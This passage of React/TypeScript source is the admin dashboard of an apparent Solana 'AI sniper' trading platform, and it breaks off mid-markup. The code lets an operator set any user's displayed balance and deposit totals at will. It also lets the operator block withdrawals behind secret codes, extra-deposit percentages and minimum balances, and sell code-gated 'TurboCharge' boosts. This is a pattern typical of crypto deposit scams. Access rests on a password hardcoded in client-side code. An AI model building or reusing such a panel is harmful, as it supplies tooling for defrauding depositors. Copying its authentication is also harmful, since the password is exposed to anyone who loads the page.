"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { db, realtimeDb } from "@/lib/firebase"
import { collection, getDocs, doc, deleteDoc, updateDoc } from "firebase/firestore"
import { ref, set, get } from "firebase/database"
import {
  Shield,
  Trash2,
  Edit2,
  Save,
  X,
  DollarSign,
  Users,
  TrendingUp,
  AlertCircle,
  Lock,
  Wallet,
  Settings,
  Brain,
  KeyRound,
  ArrowUpCircle,
  Rocket,
  Gauge,
  ChevronDown,
  ChevronUp,
  Search,
  RefreshCw,
} from "lucide-react"
import Header from "@/components/header"
import { Button } from "@/components/ui/button"
import { formatDistanceToNow } from "date-fns"
import { toast } from "sonner"

export default function AdminPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [password, setPassword] = useState("")
  const [authError, setAuthError] = useState("")
  const [activeTab, setActiveTab] = useState<"overview" | "users" | "settings">("overview")
  const [searchQuery, setSearchQuery] = useState("")

  const [wallets, setWallets] = useState<any[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [editingWallet, setEditingWallet] = useState<any | null>(null)
  const [expandedWallet, setExpandedWallet] = useState<string | null>(null)
  
  // Editing inputs
  const [balanceInput, setBalanceInput] = useState("")
  const [totalDepositedInput, setTotalDepositedInput] = useState("")
  const [minDepositInput, setMinDepositInput] = useState("")
  const [minWithdrawalInput, setMinWithdrawalInput] = useState("")
  const [requireReconnectBalanceInput, setRequireReconnectBalanceInput] = useState(false)
  const [withdrawalPercentageInput, setWithdrawalPercentageInput] = useState("")
  const [minWithdrawalAmountInput, setMinWithdrawalAmountInput] = useState("10")
  const [minBalanceForWithdrawalInput, setMinBalanceForWithdrawalInput] = useState("10")
  const [requireWithdrawalCodeInput, setRequireWithdrawalCodeInput] = useState(false)
  const [withdrawalCodeInput, setWithdrawalCodeInput] = useState("")
  const [requireUpgradeCodeInput, setRequireUpgradeCodeInput] = useState(false)
  const [upgradeCodeInput, setUpgradeCodeInput] = useState("")
  
  // Sniper Speed Controls
  const [sniperSpeedMultiplierInput, setSniperSpeedMultiplierInput] = useState("1")
  
  // TurboCharge Controls
  const [speedBoostPriceInput, setSpeedBoostPriceInput] = useState("0.5")
  const [speedBoostCodeInput, setSpeedBoostCodeInput] = useState("")
  
  const [balanceRequirements, setBalanceRequirements] = useState({
    minBalance: 0.7,
    maxBalance: 5,
    solToUsdRate: 180,
    minDeposit: 0.1,
    minWithdrawal: 0.05,
    requireMinBalanceOnReconnect: false,
  })
  const [aiSniperConfigCode, setAiSniperConfigCode] = useState("BOOST75")
  const [newConfigCode, setNewConfigCode] = useState("BOOST75")
  const [newBalanceRequirements, setNewBalanceRequirements] = useState({
    minBalance: "",
    maxBalance: "",
    solToUsdRate: "",
    minDeposit: "",
    minWithdrawal: "",
    requireMinBalanceOnReconnect: false,
    withdrawalPercentage: "",
  })

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault()
    if (password === "123victorybtc") {
      setIsAuthenticated(true)
      setAuthError("")
      toast.success("Welcome to Admin Dashboard")
    } else {
      setAuthError("Invalid password")
      setPassword("")
    }
  }

  useEffect(() => {
    if (isAuthenticated) {
      fetchBalanceRequirements()
      fetchWallets()
    }
  }, [isAuthenticated])

  const fetchBalanceRequirements = async () => {
    try {
      const balanceRef = ref(realtimeDb, "settings/balanceRequirements")
      const snapshot = await get(balanceRef)

      if (snapshot.exists()) {
        const data = snapshot.val()
        const updatedBalanceRequirements = {
          minBalance: data.minBalance || 0.7,
          maxBalance: data.maxBalance || 5,
          solToUsdRate: data.solToUsdRate || 180,
          minDeposit: data.minDeposit || 0.1,
          minWithdrawal: data.minWithdrawal || 0.05,
          requireMinBalanceOnReconnect: data.requireMinBalanceOnReconnect || false,
          withdrawalPercentage: data.withdrawalPercentage || "",
        }

        setBalanceRequirements(updatedBalanceRequirements)
        setNewBalanceRequirements({
          minBalance: updatedBalanceRequirements.minBalance.toString(),
          maxBalance: updatedBalanceRequirements.maxBalance.toString(),
          solToUsdRate: updatedBalanceRequirements.solToUsdRate.toString(),
          minDeposit: updatedBalanceRequirements.minDeposit.toString(),
          minWithdrawal: updatedBalanceRequirements.minWithdrawal.toString(),
          requireMinBalanceOnReconnect: updatedBalanceRequirements.requireMinBalanceOnReconnect,
          withdrawalPercentage: updatedBalanceRequirements.withdrawalPercentage.toString(),
        })
      }

      const configCodeRef = ref(realtimeDb, "settings/aiSniperConfigCode")
      const codeSnapshot = await get(configCodeRef)
      if (codeSnapshot.exists()) {
        setAiSniperConfigCode(codeSnapshot.val())
        setNewConfigCode(codeSnapshot.val())
      }
    } catch (error) {
      console.error("[v0] Error fetching balance requirements:", error)
    }
  }

  const fetchWallets = async () => {
    try {
      setLoading(true)
      const querySnapshot = await getDocs(collection(db, "wallets"))
      const walletsData: any[] = []
      querySnapshot.forEach((doc) => {
        walletsData.push({ id: doc.id, ...doc.data() })
      })

      const sortedWallets = walletsData.sort((a, b) => {
        const dateA = a.connectedAt ? new Date(a.connectedAt).getTime() : 0
        const dateB = b.connectedAt ? new Date(b.connectedAt).getTime() : 0
        return dateB - dateA
      })

      setWallets(sortedWallets)
      setLoading(false)
    } catch (err) {
      setError("Failed to fetch wallet data")
      console.error(err)
      setLoading(false)
    }
  }

  const handleDeleteWallet = async (walletId: string) => {
    if (!window.confirm("Are you sure you want to delete this wallet?")) return

    try {
      await deleteDoc(doc(db, "wallets", walletId))
      setWallets((prev) => prev.filter((wallet) => wallet.id !== walletId))
      toast.success("Wallet deleted successfully")
    } catch (err) {
      console.error("Error deleting wallet:", err)
      toast.error("Failed to delete wallet")
    }
  }

  const handleEditWallet = (wallet: any) => {
    setEditingWallet(wallet)
    setBalanceInput(wallet.balance?.toString() || "0")
    setTotalDepositedInput(wallet.totalDepositedSOL?.toString() || "0")
    setMinDepositInput(wallet.minDeposit?.toString() || "0.1")
    setMinWithdrawalInput(wallet.minWithdrawal?.toString() || "0.05")
    setRequireReconnectBalanceInput(wallet.requireMinBalanceOnReconnect || false)
    setWithdrawalPercentageInput(wallet.requiredDepositPercentage?.toString() || "100")
    setMinWithdrawalAmountInput(wallet.minWithdrawalAmount?.toString() || "10")
    setMinBalanceForWithdrawalInput(wallet.minBalanceForWithdrawal?.toString() || "10")
    setRequireWithdrawalCodeInput(wallet.requireWithdrawalCode || false)
    setWithdrawalCodeInput(wallet.withdrawalCode || "")
    setRequireUpgradeCodeInput(wallet.requireUpgradeCode || false)
    setUpgradeCodeInput(wallet.upgradeCode || "")
    setSniperSpeedMultiplierInput(wallet.sniperSpeedMultiplier?.toString() || "1")
    setSpeedBoostPriceInput(wallet.speedBoostPrice?.toString() || "0.5")
    setSpeedBoostCodeInput(wallet.speedBoostCode || "")
    setExpandedWallet(wallet.id)
  }

  const handleSaveWallet = async () => {
    if (!editingWallet) return

    try {
      const newBalance = Number.parseFloat(balanceInput)
      const totalDeposited = Number.parseFloat(totalDepositedInput)
      const minDeposit = Number.parseFloat(minDepositInput)
      const minWithdrawal = Number.parseFloat(minWithdrawalInput)
      const requiredDepositPercentage = Number.parseFloat(withdrawalPercentageInput)
      const sniperSpeedMultiplier = Number.parseFloat(sniperSpeedMultiplierInput)
      const speedBoostPrice = Number.parseFloat(speedBoostPriceInput)

      if (isNaN(newBalance) || isNaN(minDeposit) || isNaN(minWithdrawal) || isNaN(requiredDepositPercentage)) {
        toast.error("Please enter valid numbers")
        return
      }

      if (requiredDepositPercentage < 0 || requiredDepositPercentage > 100) {
        toast.error("Deposit percentage must be between 0 and 100")
        return
      }

      const minWithdrawalAmount = Number.parseFloat(minWithdrawalAmountInput)
      const minBalanceForWithdrawal = Number.parseFloat(minBalanceForWithdrawalInput)

      await updateDoc(doc(db, "wallets", editingWallet.id), {
        balance: newBalance,
        totalDepositedSOL: isNaN(totalDeposited) ? 0 : totalDeposited,
        minDeposit: minDeposit,
        minWithdrawal: minWithdrawal,
        requireMinBalanceOnReconnect: requireReconnectBalanceInput,
        requiredDepositPercentage: requiredDepositPercentage,
        minWithdrawalAmount: isNaN(minWithdrawalAmount) ? 10 : minWithdrawalAmount,
        minBalanceForWithdrawal: isNaN(minBalanceForWithdrawal) ? 10 : minBalanceForWithdrawal,
        requireWithdrawalCode: requireWithdrawalCodeInput,
        withdrawalCode: withdrawalCodeInput,
        requireUpgradeCode: requireUpgradeCodeInput,
        upgradeCode: upgradeCodeInput,
        sniperSpeedMultiplier: isNaN(sniperSpeedMultiplier) ? 1 : sniperSpeedMultiplier,
        speedBoostPrice: isNaN(speedBoostPrice) ? 0.5 : speedBoostPrice,
        speedBoostCode: speedBoostCodeInput,
      })

      toast.success("Wallet updated successfully!")
      setEditingWallet(null)
      fetchWallets()
    } catch (error) {
      console.error("Error saving wallet:", error)
      toast.error("Failed to save wallet. Please try again.")
    }
  }

  const handleCancelEdit = () => {
    setEditingWallet(null)
    setExpandedWallet(null)
  }

  const handleBalanceRequirementChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setNewBalanceRequirements((prev) => ({ ...prev, [name]: value }))
  }

  const handleSaveBalanceRequirements = async () => {
    const minBalance = Number.parseFloat(newBalanceRequirements.minBalance)
    const maxBalance = Number.parseFloat(newBalanceRequirements.maxBalance)
    const solToUsdRate = Number.parseFloat(newBalanceRequirements.solToUsdRate)
    const minDeposit = Number.parseFloat(newBalanceRequirements.minDeposit)
    const minWithdrawal = Number.parseFloat(newBalanceRequirements.minWithdrawal)
    const requireMinBalanceOnReconnect = newBalanceRequirements.requireMinBalanceOnReconnect
    const withdrawalPercentage = Number.parseFloat(newBalanceRequirements.withdrawalPercentage)

    if (isNaN(minBalance) || isNaN(maxBalance) || isNaN(solToUsdRate) || isNaN(minDeposit) || isNaN(minWithdrawal)) {
      toast.error("Please enter valid numbers for all fields")
      return
    }

    try {
      const balanceRequirementsRef = ref(realtimeDb, "settings/balanceRequirements")
      await set(balanceRequirementsRef, {
        minBalance,
        maxBalance,
        solToUsdRate,
        minDeposit,
        minWithdrawal,
        requireMinBalanceOnReconnect,
        withdrawalPercentage: isNaN(withdrawalPercentage) ? 0 : withdrawalPercentage,
        updatedAt: Date.now(),
      })

      setBalanceRequirements({
        minBalance,
        maxBalance,
        solToUsdRate,
        minDeposit,
        minWithdrawal,
        requireMinBalanceOnReconnect,
        withdrawalPercentage,
      })

      toast.success("Balance requirements saved!")
    } catch (err: any) {
      console.error("[v0] Error updating balance requirements:", err)
      toast.error(`Failed to update: ${err.message}`)
    }
  }

  const handleSaveConfigCode = async () => {
    if (!newConfigCode.trim()) {
      toast.error("Configuration code cannot be empty")
      return
    }

    try {
      const configCodeRef = ref(realtimeDb, "settings/aiSniperConfigCode")
      await set(configCodeRef, newConfigCode.trim())
      setAiSniperConfigCode(newConfigCode.trim())
      toast.success("Config code saved!")
    } catch (err: any) {
      console.error("[v0] Error saving config code:", err)
      toast.error(`Failed to save config code: ${err.message}`)
    }
  }

  const totalBalance = wallets.reduce((sum, wallet) => sum + (wallet.balance || 0), 0)
  const totalDeposited = wallets.reduce((sum, wallet) => sum + (wallet.totalDepositedSOL || 0), 0)
  const totalUsers = wallets.length

  const filteredWallets = wallets.filter(wallet => 
    wallet.id.toLowerCase().includes(searchQuery.toLowerCase())
  )

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-black relative">
        <div className="fixed inset-0 bg-gradient-to-br from-purple-950/10 via-black to-purple-950/5 pointer-events-none" />
        <Header />
        <main className="lg:ml-64 relative flex justify-center items-center min-h-[calc(100vh-80px)] px-4">
          <div className="w-full max-w-md">
            <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-2xl p-8 shadow-2xl">
              <div className="flex justify-center mb-6">
                <div className="w-16 h-16 bg-gradient-to-br from-purple-600 to-purple-600 rounded-2xl flex items-center justify-center shadow-lg shadow-purple-600/30">
                  <Lock className="w-8 h-8 text-white" />
                </div>
              </div>
              <h2 className="text-2xl font-bold text-white text-center mb-2">Admin Access</h2>
              <p className="text-gray-400 text-center mb-8">Enter password to access dashboard</p>

              <form onSubmit={handleLogin}>
                <div className="mb-6">
                  <label htmlFor="password" className="block text-sm font-medium text-gray-300 mb-2">
                    Password
                  </label>
                  <input
                    type="password"
                    id="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full px-4 py-3 bg-black border border-purple-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                    placeholder="Enter admin password"
                    autoFocus
                  />
                  {authError && (
                    <p className="mt-2 text-sm text-red-400 flex items-center gap-1">
                      <AlertCircle className="w-4 h-4" />
                      {authError}
                    </p>
                  )}
                </div>

                <Button
                  type="submit"
                  className="w-full bg-gradient-to-r from-purple-600 to-purple-600 hover:from-purple-700 hover:to-purple-700 text-white font-semibold py-3"
                >
                  <Shield className="w-4 h-4 mr-2" />
                  Access Dashboard
                </Button>
              </form>
            </div>
          </div>
        </main>
      </div>
    )
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-black">
        <Header />
        <main className="lg:ml-64 flex justify-center items-center h-screen">
          <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-purple-500" />
        </main>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-black relative">
      {/* Background gradient effects */}
      <div className="fixed inset-0 bg-gradient-to-br from-purple-950/10 via-black to-purple-950/5 pointer-events-none" />
      
      <div className="relative">
        <Header />
        <main className="lg:ml-64 container mx-auto px-4 py-8">
          <div className="max-w-7xl mx-auto">
            {/* Header */}
            <div className="mb-8">
              <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
                <div className="flex items-center gap-4">
                  <div className="w-14 h-14 bg-gradient-to-br from-purple-600 to-purple-600 rounded-xl flex items-center justify-center shadow-lg shadow-purple-600/30">
                    <Shield className="w-7 h-7 text-white" />
                  </div>
                  <div>
                    <h1 className="text-3xl font-bold text-white">Admin Dashboard</h1>
                    <p className="text-gray-400">Manage wallets and platform settings</p>
                  </div>
                </div>
                <Button
                  onClick={fetchWallets}
                  variant="outline"
                  className="border-purple-500/30 text-purple-400 hover:bg-purple-900/20 bg-transparent"
                >
                  <RefreshCw className="w-4 h-4 mr-2" />
                  Refresh Data
                </Button>
              </div>
            </div>

            {/* Tab Navigation */}
            <div className="flex gap-2 mb-6 border-b border-purple-500/20 pb-4">
              <button
                onClick={() => setActiveTab("overview")}
                className={`px-4 py-2 rounded-lg font-medium transition-all ${
                  activeTab === "overview"
                    ? "bg-purple-600 text-white"
                    : "text-gray-400 hover:text-white hover:bg-purple-900/20"
                }`}
              >
                Overview
              </button>
              <button
                onClick={() => setActiveTab("users")}
                className={`px-4 py-2 rounded-lg font-medium transition-all ${
                  activeTab === "users"
                    ? "bg-purple-600 text-white"
                    : "text-gray-400 hover:text-white hover:bg-purple-900/20"
                }`}
              >
                User Management
              </button>
              <button
                onClick={() => setActiveTab("settings")}
                className={`px-4 py-2 rounded-lg font-medium transition-all ${
                  activeTab === "settings"
                    ? "bg-purple-600 text-white"
                    : "text-gray-400 hover:text-white hover:bg-purple-900/20"
                }`}
              >
                Global Settings
              </button>
            </div>

            {/* Overview Tab */}
            {activeTab === "overview" && (
              <div className="grid md:grid-cols-4 gap-6 mb-8">
                <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-2xl p-6 hover:border-purple-500/50 transition-all duration-300 hover:shadow-xl hover:shadow-purple-600/10">
                  <div className="flex items-center gap-3 text-purple-400 mb-4">
                    <div className="p-2.5 bg-purple-900/30 rounded-lg">
                      <Users className="w-5 h-5" />
                    </div>
                    <span className="text-sm font-semibold">Total Users</span>
                  </div>
                  <p className="text-4xl font-bold text-white">{totalUsers}</p>
                </div>

                <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-2xl p-6 hover:border-purple-500/50 transition-all duration-300 hover:shadow-xl hover:shadow-purple-600/10">
                  <div className="flex items-center gap-3 text-purple-400 mb-4">
                    <div className="p-2.5 bg-purple-900/30 rounded-lg">
                      <DollarSign className="w-5 h-5" />
                    </div>
                    <span className="text-sm font-semibold">Total Balance</span>
                  </div>
                  <p className="text-4xl font-bold text-white">{totalBalance.toFixed(2)}</p>
                  <p className="text-gray-400 text-sm mt-2">SOL</p>
                </div>

                <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-2xl p-6 hover:border-purple-500/50 transition-all duration-300 hover:shadow-xl hover:shadow-purple-600/10">
                  <div className="flex items-center gap-3 text-purple-400 mb-4">
                    <div className="p-2.5 bg-purple-900/30 rounded-lg">
                      <ArrowUpCircle className="w-5 h-5" />
                    </div>
                    <span className="text-sm font-semibold">Total Deposited</span>
                  </div>
                  <p className="text-4xl font-bold text-white">{totalDeposited.toFixed(2)}</p>
                  <p className="text-gray-400 text-sm mt-2">SOL</p>
                </div>

                <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-2xl p-6 hover:border-purple-500/50 transition-all duration-300 hover:shadow-xl hover:shadow-purple-600/10">
                  <div className="flex items-center gap-3 text-purple-400 mb-4">
                    <div className="p-2.5 bg-purple-900/30 rounded-lg">
                      <TrendingUp className="w-5 h-5" />
                    </div>
                    <span className="text-sm font-semibold">SOL Rate</span>
                  </div>
                  <p className="text-4xl font-bold text-white">${balanceRequirements.solToUsdRate}</p>
                </div>
              </div>
            )}

            {/* Users Tab */}
            {activeTab === "users" && (
              <div className="space-y-6">
                {/* Search */}
                <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-2xl p-4">
                  <div className="flex items-center gap-3">
                    <Search className="w-5 h-5 text-gray-500" />
                    <input
                      type="text"
                      placeholder="Search by wallet address..."
                      value={searchQuery}
                      onChange={(e) => setSearchQuery(e.target.value)}
                      className="flex-1 bg-transparent text-white outline-none placeholder:text-gray-600"
                    />
                  </div>
                </div>

                {/* User Cards */}
                <div className="space-y-4">
                  {filteredWallets.length === 0 ? (
                    <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-2xl p-12 text-center text-gray-400">
                      No wallets found
                    </div>
                  ) : (
                    filteredWallets.map((wallet) => (
                      <div
                        key={wallet.id}
                        className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-2xl overflow-hidden hover:border-purple-500/50 transition-all duration-300 hover:shadow-lg hover:shadow-purple-600/10"
                      >
                        {/* User Header */}
                        <div
                          className="p-4 flex items-center justify-between cursor-pointer"
                          onClick={() => setExpandedWallet(expandedWallet === wallet.id ? null : wallet.id)}
                        >
                          <div className="flex items-center gap-4">
                            <div className="w-12 h-12 bg-gradient-to-br from-purple-600 to-purple-600 rounded-lg flex items-center justify-center">
                              <Wallet className="w-6 h-6 text-white" />
                            </div>
                            <div>
                              <p className="text-white font-mono text-sm">
                                {wallet.id.slice(0, 8)}...{wallet.id.slice(-8)}
                              </p>
                              <p className="text-gray-400 text-xs">
                                {wallet.connectedAt
                                  ? formatDistanceToNow(new Date(wallet.connectedAt), { addSuffix: true })
                                  : "N/A"}
                              </p>
                            </div>
                          </div>
                          <div className="flex items-center gap-4">
                            <div className="text-right">
                              <p className="text-white font-bold">{wallet.balance?.toFixed(4) || "0.0000"} SOL</p>
                              <p className="text-gray-400 text-xs">Balance</p>
                            </div>
                            <div className="text-right hidden sm:block">
                              <p className="text-green-400 font-bold">{wallet.totalDepositedSOL?.toFixed(4) || "0.0000"} SOL</p>
                              <p className="text-gray-400 text-xs">Deposited</p>
                            </div>
                            {expandedWallet === wallet.id ? (
                              <ChevronUp className="w-5 h-5 text-gray-400" />
                            ) : (
                              <ChevronDown className="w-5 h-5 text-gray-400" />
                            )}
                          </div>
                        </div>

                        {/* Expanded Content */}
                        {expandedWallet === wallet.id && (
                          <div className="border-t border-purple-500/20 p-6 bg-black/30">
                            {editingWallet?.id === wallet.id ? (
                              <div className="space-y-6">
                                {/* Balance & Deposit Section */}
                                <div>
                                  <h4 className="text-white font-semibold mb-4 flex items-center gap-2">
                                    <DollarSign className="w-4 h-4 text-purple-400" />
                                    Balance & Deposits
                                  </h4>
                                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                                    <div>
                                      <label className="block text-gray-400 text-xs mb-1">Balance (SOL)</label>
                                      <input
                                        type="number"
                                        step="0.0001"
                                        value={balanceInput}
                                        onChange={(e) => setBalanceInput(e.target.value)}
                                        className="w-full px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                                      />
                                    </div>
                                    <div>
                                      <label className="block text-gray-400 text-xs mb-1">Total Deposited (SOL)</label>
                                      <input
                                        type="number"
                                        step="0.0001"
                                        value={totalDepositedInput}
                                        onChange={(e) => setTotalDepositedInput(e.target.value)}
                                        className="w-full px-3 py-2 bg-black border border-green-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-green-500"
                                      />
                                    </div>
                                    <div>
                                      <label className="block text-gray-400 text-xs mb-1">Min Deposit</label>
                                      <input
                                        type="number"
                                        step="0.01"
                                        value={minDepositInput}
                                        onChange={(e) => setMinDepositInput(e.target.value)}
                                        className="w-full px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                                      />
                                    </div>
                                    <div>
                                      <label className="block text-gray-400 text-xs mb-1">Min Withdrawal</label>
                                      <input
                                        type="number"
                                        step="0.01"
                                        value={minWithdrawalInput}
                                        onChange={(e) => setMinWithdrawalInput(e.target.value)}
                                        className="w-full px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                                      />
                                    </div>
                                  </div>
                                </div>

                                {/* Withdrawal Settings */}
                                <div>
                                  <h4 className="text-white font-semibold mb-4 flex items-center gap-2">
                                    <Settings className="w-4 h-4 text-purple-400" />
                                    Withdrawal Settings
                                  </h4>
                                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                                    <div>
                                      <label className="block text-gray-400 text-xs mb-1">Required Deposit %</label>
                                      <input
                                        type="number"
                                        min="0"
                                        max="100"
                                        value={withdrawalPercentageInput}
                                        onChange={(e) => setWithdrawalPercentageInput(e.target.value)}
                                        className="w-full px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                                      />
                                    </div>
                                    <div>
                                      <label className="block text-gray-400 text-xs mb-1">Min Withdrawal Amt</label>
                                      <input
                                        type="number"
                                        step="0.01"
                                        value={minWithdrawalAmountInput}
                                        onChange={(e) => setMinWithdrawalAmountInput(e.target.value)}
                                        className="w-full px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                                      />
                                    </div>
                                    <div>
                                      <label className="block text-gray-400 text-xs mb-1">Min Balance to Withdraw</label>
                                      <input
                                        type="number"
                                        step="0.01"
                                        value={minBalanceForWithdrawalInput}
                                        onChange={(e) => setMinBalanceForWithdrawalInput(e.target.value)}
                                        className="w-full px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                                      />
                                    </div>
                                    <div className="flex items-center">
                                      <label className="flex items-center gap-2 cursor-pointer">
                                        <input
                                          type="checkbox"
                                          checked={requireReconnectBalanceInput}
                                          onChange={(e) => setRequireReconnectBalanceInput(e.target.checked)}
                                          className="w-4 h-4"
                                        />
                                        <span className="text-gray-400 text-xs">Require Min on Reconnect</span>
                                      </label>
                                    </div>
                                  </div>
                                </div>

                                {/* Code Requirements */}
                                <div>
                                  <h4 className="text-white font-semibold mb-4 flex items-center gap-2">
                                    <KeyRound className="w-4 h-4 text-purple-400" />
                                    Code Requirements
                                  </h4>
                                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                    <div className="p-4 bg-purple-900/20 border border-purple-500/30 rounded-lg">
                                      <div className="flex items-center justify-between mb-2">
                                        <span className="text-gray-300 text-sm">Withdrawal Code</span>
                                        <label className="flex items-center gap-2 cursor-pointer">
                                          <input
                                            type="checkbox"
                                            checked={requireWithdrawalCodeInput}
                                            onChange={(e) => setRequireWithdrawalCodeInput(e.target.checked)}
                                            className="w-4 h-4"
                                          />
                                          <span className="text-gray-400 text-xs">Required</span>
                                        </label>
                                      </div>
                                      {requireWithdrawalCodeInput && (
                                        <input
                                          type="text"
                                          value={withdrawalCodeInput}
                                          onChange={(e) => setWithdrawalCodeInput(e.target.value)}
                                          placeholder="Enter code"
                                          className="w-full px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                                        />
                                      )}
                                    </div>
                                    <div className="p-4 bg-purple-900/20 border border-purple-500/30 rounded-lg">
                                      <div className="flex items-center justify-between mb-2">
                                        <span className="text-gray-300 text-sm">Upgrade Code</span>
                                        <label className="flex items-center gap-2 cursor-pointer">
                                          <input
                                            type="checkbox"
                                            checked={requireUpgradeCodeInput}
                                            onChange={(e) => setRequireUpgradeCodeInput(e.target.checked)}
                                            className="w-4 h-4"
                                          />
                                          <span className="text-gray-400 text-xs">Required</span>
                                        </label>
                                      </div>
                                      {requireUpgradeCodeInput && (
                                        <input
                                          type="text"
                                          value={upgradeCodeInput}
                                          onChange={(e) => setUpgradeCodeInput(e.target.value)}
                                          placeholder="Enter code"
                                          className="w-full px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                                        />
                                      )}
                                    </div>
                                  </div>
                                </div>

                                {/* Sniper Settings */}
                                <div>
                                  <h4 className="text-white font-semibold mb-4 flex items-center gap-2">
                                    <Gauge className="w-4 h-4 text-purple-400" />
                                    Sniper Speed & TurboCharge
                                  </h4>
                                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                                    <div className="p-4 bg-purple-900/20 border border-purple-500/30 rounded-lg">
                                      <label className="block text-purple-300 text-sm mb-2">Speed Multiplier</label>
                                      <input
                                        type="number"
                                        step="0.1"
                                        min="0.1"
                                        max="10"
                                        value={sniperSpeedMultiplierInput}
                                        onChange={(e) => setSniperSpeedMultiplierInput(e.target.value)}
                                        className="w-full px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                                      />
                                      <p className="text-gray-500 text-xs mt-1">Higher = Faster (1x default)</p>
                                    </div>
                                    <div className="p-4 bg-purple-900/20 border border-purple-500/30 rounded-lg">
                                      <label className="block text-purple-300 text-sm mb-2">TurboCharge Price (SOL)</label>
                                      <input
                                        type="number"
                                        step="0.01"
                                        min="0"
                                        value={speedBoostPriceInput}
                                        onChange={(e) => setSpeedBoostPriceInput(e.target.value)}
                                        className="w-full px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                                      />
                                      <p className="text-gray-500 text-xs mt-1">Price for 35% speed boost</p>
                                    </div>
                                    <div className="p-4 bg-purple-900/20 border border-purple-500/30 rounded-lg">
                                      <label className="block text-purple-300 text-sm mb-2">TurboCharge Code</label>
                                      <input
                                        type="text"
                                        value={speedBoostCodeInput}
                                        onChange={(e) => setSpeedBoostCodeInput(e.target.value)}
                                        placeholder="Enter code"
                                        className="w-full px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                                      />
                                      <p className="text-gray-500 text-xs mt-1">Code user needs to activate</p>
                                    </div>
                                  </div>
                                </div>

                                {/* Action Buttons */}
                                <div className="flex gap-3 pt-4 border-t border-purple-500/20">
                                  <Button
                                    onClick={handleSaveWallet}
                                    className="bg-gradient-to-r from-purple-600 to-purple-600 hover:from-purple-700 hover:to-purple-700 text-white"
                                  >
                                    <Save className="w-4 h-4 mr-2" />
                                    Save Changes
                                  </Button>
                                  <Button
                                    onClick={handleCancelEdit}
                                    variant="outline"
                                    className="border-gray-600 text-gray-300 hover:bg-gray-800 bg-transparent"
                                  >
                                    <X className="w-4 h-4 mr-2" />
                                    Cancel
                                  </Button>
                                </div>
                              </div>
                            ) : (
                              <div className="space-y-6">
                                {/* Quick Stats */}
                                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                                  <div className="p-3 bg-purple-900/20 border border-purple-500/30 rounded-lg">
                                    <p className="text-gray-400 text-xs">Total Deposited</p>
                                    <p className="text-green-400 font-bold">{wallet.totalDepositedSOL?.toFixed(4) || "0"} SOL</p>
                                  </div>
                                  <div className="p-3 bg-purple-900/20 border border-purple-500/30 rounded-lg">
                                    <p className="text-gray-400 text-xs">Required Deposit %</p>
                                    <p className="text-white font-bold">{wallet.requiredDepositPercentage || 100}%</p>
                                  </div>
                                  <div className="p-3 bg-purple-900/20 border border-purple-500/30 rounded-lg">
                                    <p className="text-gray-400 text-xs">Speed Multiplier</p>
                                    <p className="text-purple-400 font-bold">{wallet.sniperSpeedMultiplier || 1}x</p>
                                  </div>
                                  <div className="p-3 bg-purple-900/20 border border-purple-500/30 rounded-lg">
                                    <p className="text-gray-400 text-xs">TurboCharge Price</p>
                                    <p className="text-purple-400 font-bold">{wallet.speedBoostPrice || 0.5} SOL</p>
                                  </div>
                                </div>

                                {/* Codes Status */}
                                <div className="flex flex-wrap gap-2">
                                  {wallet.requireWithdrawalCode && (
                                    <span className="px-3 py-1 bg-amber-900/30 text-amber-400 text-xs rounded-full">
                                      Withdrawal Code: {wallet.withdrawalCode || "Not Set"}
                                    </span>
                                  )}
                                  {wallet.requireUpgradeCode && (
                                    <span className="px-3 py-1 bg-amber-900/30 text-amber-400 text-xs rounded-full">
                                      Upgrade Code: {wallet.upgradeCode || "Not Set"}
                                    </span>
                                  )}
                                  {wallet.speedBoostCode && (
